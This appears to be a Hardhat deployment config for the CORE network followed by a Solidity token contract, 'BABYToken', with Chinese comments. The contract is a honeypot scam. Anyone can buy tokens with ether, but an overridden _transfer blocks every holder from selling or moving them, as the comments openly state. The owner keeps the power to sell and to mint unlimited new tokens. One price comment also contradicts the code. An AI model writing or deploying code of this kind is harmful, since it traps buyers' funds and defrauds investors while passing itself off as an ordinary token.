require("@nomicfoundation/hardhat-toolbox");

module.exports = {
  solidity: "0.8.0",
  networks: {
    core: {
      url: "https://rpc.coredao.org", // CORE 主网 RPC 节点
      accounts: ["YOUR_PRIVATE_KEY"], // 替换为你的发币者私钥
    },
  },
};// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC20/extensions/ERC20Capped.sol";
import "@openzeppelin/contracts/access/Ownable.sol";

contract BABYToken is ERC20Capped, Ownable {
    mapping(address => bool) public whitelist; // 白名单
    mapping(address => bool) public hasBought; // 记录用户是否购买过代币

    constructor(uint256 initialSupply) ERC20("BABY", "ba by pi") ERC20Capped(890000 * 10 ** 18) {
        _mint(msg.sender, initialSupply); // 初始发行量
    }

    // 购买代币功能：允许任何用户购买代币
    function buyTokens() external payable {
        require(msg.value > 0, "You must send some ether to buy tokens");

        // 假设每个代币的价格是 1 ether（可以根据需求调整）
        uint256 amount = msg.value * 100; // 1 ether = 100 代币
        require(amount <= balanceOf(owner()), "Not enough tokens available to buy");

        _transfer(owner(), msg.sender, amount); // 转移代币给购买者
        hasBought[msg.sender] = true; // 标记用户已购买
    }

    // 卖出代币功能：仅发币者可以卖出
    function sellTokens(uint256 amount) external onlyOwner {
        _transfer(owner(), msg.sender, amount);
    }

    // 增发功能：发币者可以增发代币
    function mint(address account, uint256 amount) external onlyOwner {
        _mint(account, amount);
    }

    // 设置白名单：发币者可以设置白名单
    function setWhitelist(address account, bool status) external onlyOwner {
        whitelist[account] = status;
    }

    // 覆盖 transfer 函数：阻止普通用户卖出代币
    function _transfer(address sender, address recipient, uint256 amount) internal override {
        // 只允许发币者卖出代币
        if (sender != owner() && recipient != owner()) {
            revert("Users cannot transfer tokens");
        }

        super._transfer(sender, recipient, amount);
    }
}
